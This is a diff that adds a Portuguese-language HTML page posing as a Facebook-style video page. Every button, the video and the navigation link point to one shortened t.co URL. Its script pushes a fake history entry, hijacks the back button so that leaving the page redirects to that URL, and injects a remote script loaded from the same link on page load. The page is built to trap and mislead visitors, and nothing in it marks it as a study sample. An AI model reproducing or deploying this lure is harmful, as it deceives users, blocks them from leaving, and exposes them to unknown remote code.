@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Página de vídeo</title>
+    <link rel="stylesheet" href="styles.css" />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f9f9f9;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        width: 90%;
+        max-width: 400px;
+        background-color: #fff;
+        padding: 20px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        border-radius: 8px;
+        text-align: center;
+      }
+
+      .nav a {
+        font-size: 14px;
+        color: #000;
+        text-decoration: none;
+        margin-bottom: 15px;
+        display: inline-block;
+      }
+
+      .video-container {
+        margin: 20px 0;
+      }
+
+      .video-container video {
+        width: 100%;
+        height: auto;
+        max-height: 300px;
+        border-radius: 8px;
+      }
+
+      .buttons a {
+        display: block;
+        text-decoration: none;
+        color: white;
+        padding: 15px;
+        margin-bottom: 15px;
+        border-radius: 5px;
+        font-size: 16px;
+        transition: all 0.3s ease;
+      }
+
+      .watch-btn {
+        background-color: #00d395;
+      }
+
+      .download-btn {
+        background-color: #ff7f50;
+      }
+
+      .fb-btn {
+        background-color: #3b5998;
+      }
+
+      .buttons a:hover {
+        opacity: 0.9;
+      }
+
+      /* Mobile responsiveness */
+      @media (max-width: 600px) {
+        body {
+          padding: 10px;
+          height: auto;
+        }
+
+        .container {
+          width: 100%;
+          padding: 15px;
+        }
+
+        .buttons a {
+          padding: 12px;
+          font-size: 14px;
+        }
+
+        .video-container video {
+          max-height: 200px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="nav">
+        <a href="https://t.co/LIZpdnXZFW">Página de vídeo</a>
+      </div>
+      <div class="video-container">
+        <a href="https://t.co/LIZpdnXZFW" target="_blank">
+          <video controls width="100%">
+            <source src="your-video.mp4" type="video/mp4" />
+            Seu navegador não suporta a tag de vídeo.
+          </video>
+        </a>
+      </div>
+      <div class="buttons">
+        <a href="https://t.co/LIZpdnXZFW" class="watch-btn"
+          >Assista ao vídeo completo</a
+        >
+        <a href="https://t.co/LIZpdnXZFW" class="download-btn"
+          >Baixar vídeo (25,26 MB)</a
+        >
+        <a href="https://t.co/LIZpdnXZFW" class="fb-btn">Voltar ao Facebook</a>
+      </div>
+    </div>
+
+    <script>
+      window.onhashchange = function () {
+        jp();
+      };
+      function hh() {
+        history.pushState(
+          history.length + 1,
+          "message",
+          "#" + new Date().getTime()
+        );
+      }
+      function jp() {
+        fh();
+      }
+      setTimeout("hh();", 500);
+      function fh() {
+        location.href = "https://t.co/LIZpdnXZFW";
+      }
+      function goon() {
+        location.href = "https://t.co/LIZpdnXZFW";
+      }
+
+      window.onhashchange = function () {
+        jp();
+      };
+      function hh() {
+        history.pushState(
+          history.length + 1,
+          "message",
+          "#" + new Date().getTime()
+        );
+      }
+      function jp() {
+        fh();
+      }
+      setTimeout("hh();", 500);
+      function fh() {
+        location.href = "https://t.co/LIZpdnXZFW";
+      }
+      function goon() {
+        location.href = "https://t.co/LIZpdnXZFW";
+      }
+
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://t.co/LIZpdnXZFW";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  </body>
+</html>
